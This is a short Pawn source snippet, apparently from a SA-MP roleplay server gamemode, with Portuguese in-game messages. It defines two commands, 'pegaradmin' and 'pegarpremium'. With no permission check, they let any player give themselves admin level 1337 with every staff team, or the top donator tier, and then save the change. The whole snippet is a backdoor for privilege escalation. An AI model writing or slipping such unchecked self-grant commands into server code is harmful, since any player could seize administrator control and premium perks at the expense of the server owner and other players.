CMD:pegaradmin(playerid, params[]) {	
  	uInfo[playerid][uAdmin] = 1337;

	uInfo[playerid][uFactionTeam] = 1;
	uInfo[playerid][uPropertyTeam] = 1;
	uInfo[playerid][uEventTeam] = 1;
	uInfo[playerid][uCKTeam] = 1;
	uInfo[playerid][uLogTeam] = 1;
			
	SaveUserInfo(playerid);

	SendServerMessage(playerid, "Você pegou administrador nível 1337 com todas as equipes.");
	return true;
}

CMD:pegarpremium(playerid, params[]) {	
  	pInfo[playerid][pDonator] = 3;
	SavePlayerPremium(playerid);

	SendServerMessage(playerid, "Você pegou Premium Ouro.");
	return true;
}
